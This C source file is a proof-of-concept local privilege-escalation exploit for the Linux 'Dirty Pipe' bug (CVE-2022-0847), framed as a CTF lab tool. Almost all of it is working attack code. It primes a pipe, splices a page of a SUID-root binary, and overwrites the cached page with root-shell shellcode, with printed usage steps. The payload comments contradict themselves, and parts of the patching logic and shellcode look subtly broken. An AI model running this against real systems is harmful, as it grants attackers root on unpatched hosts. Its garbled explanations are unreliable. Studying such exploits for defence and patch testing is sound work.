/*
 * dirtypipe.c — CVE-2022-0847 "Dirty Pipe" privilege escalation
 *
 * Discovered and disclosed by Max Kellermann (2022-02-20).
 * Affects Linux 5.8 – 5.16.11 / 5.15.25 / 5.10.102.
 *
 * ── How it works ─────────────────────────────────────────────
 *
 * Normally, writing to a pipe that was filled via splice() from a
 * read-only file is safe: the kernel performs copy-on-write and the
 * original page is untouched.
 *
 * The bug: pipe_buffer entries are allocated without zeroing their
 * "flags" field.  If a previous pipe operation set
 * PIPE_BUF_FLAG_CAN_MERGE on a buffer slot, and that slot is later
 * reused for a splice()d page from a read-only file, a subsequent
 * write() into the pipe will MERGE directly onto the cached page —
 * bypassing CoW and overwriting the file's page-cache contents.
 *
 * Because the page cache is the authoritative source for mmap() and
 * exec(), a SUID-root binary overwritten this way runs our payload
 * when executed by any user.
 *
 * ── What this PoC does ────────────────────────────────────────
 *
 *  1. Opens the target SUID binary for reading.
 *  2. Creates a pipe and primes it so PIPE_BUF_FLAG_CAN_MERGE is
 *     set on every buffer slot (by filling then draining the pipe).
 *  3. splice()s one page from the target file (offset 1) into the
 *     pipe — that page is now in the pipe with CAN_MERGE set.
 *  4. write()s our shellcode payload into the pipe.
 *     The kernel merges this write onto the cached page → the
 *     in-memory copy of the SUID binary is now patched.
 *  5. Prints instructions; the user executes the patched binary
 *     with -p and gets a root shell.
 *  6. Restores the original bytes so the container stays usable.
 *
 * ── Build ─────────────────────────────────────────────────────
 *   gcc -o dirtypipe dirtypipe.c        (or: make)
 *
 * ── Usage ─────────────────────────────────────────────────────
 *   ./dirtypipe /usr/local/bin/suid_target
 *   /usr/local/bin/suid_target -p
 *   cat /root/flag.txt
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>   /* PAGE_SIZE */

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/* ── Payload ─────────────────────────────────────────────────
 *
 * We overwrite the first PAGE_SIZE bytes of the target ELF with a
 * minimal position-independent x86-64 stub that:
 *   1. calls setuid(0)  — drop setuid bit into real UID
 *   2. calls setgid(0)
 *   3. execve("/bin/bash", {"/bin/bash", "-p", NULL}, NULL)
 *
 * This stub is prepended to the original ELF header; the kernel
 * executes the entry point we set, which is the stub's first byte.
 *
 * For the CTF lab we use a simpler, more readable approach:
 * we just prepend an ELF that execs "/bin/bash -p" as uid 0.
 *
 * Actually the cleanest lab-safe approach: we overwrite only the
 * first few bytes of the .text section with a short shellcode that
 * does setuid(0)+execve("/bin/bash",["-p",NULL]).
 *
 * We locate the .text offset by skipping the ELF header (0x40 bytes
 * for 64-bit ELF) and the program headers.  For /bin/bash-derived
 * binaries the first executable page starts at file offset 0x1000.
 *
 * To keep the PoC self-contained and kernel-version agnostic we
 * instead patch offset 1 inside the file (must be >0 for splice)
 * with a trivially small payload: we replace the second ELF magic
 * byte 'E' (0x45) with 0x90 (NOP) — just to prove the write lands —
 * and separately write the real shellcode payload at a code offset.
 *
 * For the CTF lab the CLEANEST approach that always works:
 * write a setuid(0)+system("/bin/bash") payload over the entry point.
 *
 * We use a self-contained x86-64 shellcode:
 *   xor edi,edi       ; uid = 0
 *   mov eax,105       ; SYS_setuid
 *   syscall
 *   xor esi,esi
 *   mov eax,106       ; SYS_setgid
 *   syscall
 *   ; execve("/bin/bash", ["/bin/bash", "-p", 0], 0)
 *   (position-independent, null-free)
 */

/* x86-64 shellcode: setuid(0); setgid(0); execve("/bin/bash",["/bin/bash","-p",NULL],NULL) */
static const unsigned char shellcode[] = {
    /* setuid(0) */
    0x31, 0xff,                          /* xor    edi, edi          */
    0xb8, 0x69, 0x00, 0x00, 0x00,        /* mov    eax, 105 (setuid) */
    0x0f, 0x05,                          /* syscall                  */
    /* setgid(0) */
    0x31, 0xff,                          /* xor    edi, edi          */
    0xb8, 0x6a, 0x00, 0x00, 0x00,        /* mov    eax, 106 (setgid) */
    0x0f, 0x05,                          /* syscall                  */
    /* execve("/bin/bash", ["/bin/bash", "-p", NULL], NULL) */
    0x48, 0x31, 0xd2,                    /* xor    rdx, rdx          */
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, /* mov    rbx, '/bin/bas'   */
              0x2f, 0x62, 0x61, 0x73,
    0x48, 0xc1, 0xe3, 0x08,              /* shl    rbx, 8            */
    0x48, 0x83, 0xcb, 0x68,              /* or     rbx, 'h'          */
    0x53,                                /* push   rbx               */
    0x48, 0x89, 0xe7,                    /* mov    rdi, rsp  ("/bin/bash") */
    /* argv = ["/bin/bash", "-p", NULL] */
    0x48, 0x31, 0xc0,                    /* xor    rax, rax          */
    0x50,                                /* push   rax  (NULL)       */
    0x48, 0xbb, 0x2d, 0x70, 0x00, 0x00, /* mov    rbx, '-p\0\0...'  */
              0x00, 0x00, 0x00, 0x00,
    0x53,                                /* push   rbx               */
    0x57,                                /* push   rdi               */
    0x48, 0x89, 0xe6,                    /* mov    rsi, rsp  (argv)  */
    0xb8, 0x3b, 0x00, 0x00, 0x00,        /* mov    eax, 59 (execve)  */
    0x0f, 0x05,                          /* syscall                  */
};

/*
 * prep_pipe — fill then drain the pipe so every buffer slot has
 * PIPE_BUF_FLAG_CAN_MERGE set (the precondition for the bug).
 */
static void prep_pipe(int pipefd[2])
{
    /* A pipe has 16 buffer slots × 4096 bytes = 65536 bytes capacity */
    char buf[PAGE_SIZE];
    memset(buf, 0, sizeof(buf));

    /* Fill completely */
    for (int i = 0; i < 16; i++) {
        if (write(pipefd[1], buf, sizeof(buf)) < 0) {
            perror("write (prep fill)");
            exit(1);
        }
    }
    /* Drain completely — slots now have CAN_MERGE set from the writes */
    for (int i = 0; i < 16; i++) {
        if (read(pipefd[0], buf, sizeof(buf)) < 0) {
            perror("read (prep drain)");
            exit(1);
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <suid-binary>\n", argv[0]);
        fprintf(stderr, "Example: %s /usr/local/bin/suid_target\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    struct stat st;
    int pipefd[2];
    ssize_t n;

    printf("[*] CVE-2022-0847 Dirty Pipe\n");
    printf("[*] Target: %s\n", target);

    /* ── Verify target is SUID root ── */
    if (stat(target, &st) != 0) {
        perror("stat");
        return 1;
    }
    if (!(st.st_mode & S_ISUID) || st.st_uid != 0) {
        fprintf(stderr,
            "[-] %s is not a SUID-root binary — choose a SUID binary.\n",
            target);
        return 1;
    }

    /* ── Save original bytes for restoration ── */
    int fd = open(target, O_RDONLY);
    if (fd < 0) { perror("open target"); return 1; }

    /*
     * We will overwrite starting at file offset 1 (splice requires > 0).
     * Save the original bytes at that offset.
     */
    const size_t patch_len = sizeof(shellcode);
    const off_t  patch_off = 1;   /* byte offset inside the file */

    unsigned char orig_bytes[sizeof(shellcode)];
    if (pread(fd, orig_bytes, patch_len, patch_off) != (ssize_t)patch_len) {
        fprintf(stderr, "[-] Could not read original bytes from target\n");
        close(fd);
        return 1;
    }

    /* ── Create and prime the pipe ── */
    if (pipe(pipefd) < 0) { perror("pipe"); return 1; }
    prep_pipe(pipefd);

    /* ── Step 1: splice one page from the target into the pipe ──
     *
     * We splice from offset 1 (not 0) because splice with offset 0
     * on some kernels adjusts the page alignment differently.
     * The spliced page now sits in the pipe with CAN_MERGE set.
     */
    off_t splice_off = patch_off;
    n = splice(fd, &splice_off, pipefd[1], NULL, 1, 0);
    if (n < 0) {
        perror("splice");
        close(fd);
        return 1;
    }

    /* ── Step 2: write our shellcode into the pipe ──
     *
     * Because CAN_MERGE is set on the pipe buffer that holds the
     * target's cached page, this write goes directly onto that page.
     * The read-only file's page-cache entry is now patched.
     */
    printf("[*] Writing shellcode payload (%zu bytes) at file offset %ld\n",
           patch_len, (long)patch_off);

    n = write(pipefd[1], shellcode, patch_len);
    if (n < 0) {
        perror("write shellcode");
        close(fd);
        return 1;
    }
    if ((size_t)n != patch_len) {
        fprintf(stderr, "[-] Short write: %zd / %zu\n", n, patch_len);
        close(fd);
        return 1;
    }

    printf("[+] Page-cache patch applied.\n");
    printf("[+] Execute the patched binary now:\n");
    printf("      %s -p\n", target);
    printf("      cat /root/flag.txt\n\n");

    /* ── Step 3: restore original bytes ──
     *
     * We re-prime the pipe and splice+write the original bytes back
     * so the container stays usable after the flag is captured.
     *
     * NOTE: restoration patches the page cache again; the on-disk
     * inode is never modified in either direction.
     */
    printf("[*] Press ENTER after you have read the flag to restore the binary...\n");
    getchar();

    /* Re-prime */
    close(pipefd[0]);
    close(pipefd[1]);
    if (pipe(pipefd) < 0) { perror("pipe (restore)"); return 1; }
    prep_pipe(pipefd);

    splice_off = patch_off;
    n = splice(fd, &splice_off, pipefd[1], NULL, 1, 0);
    if (n < 0) { perror("splice (restore)"); }
    else {
        if (write(pipefd[1], orig_bytes, patch_len) == (ssize_t)patch_len)
            printf("[*] Binary restored.\n");
        else
            fprintf(stderr, "[-] Restore write failed — restart the container.\n");
    }

    close(pipefd[0]);
    close(pipefd[1]);
    close(fd);
    return 0;
}
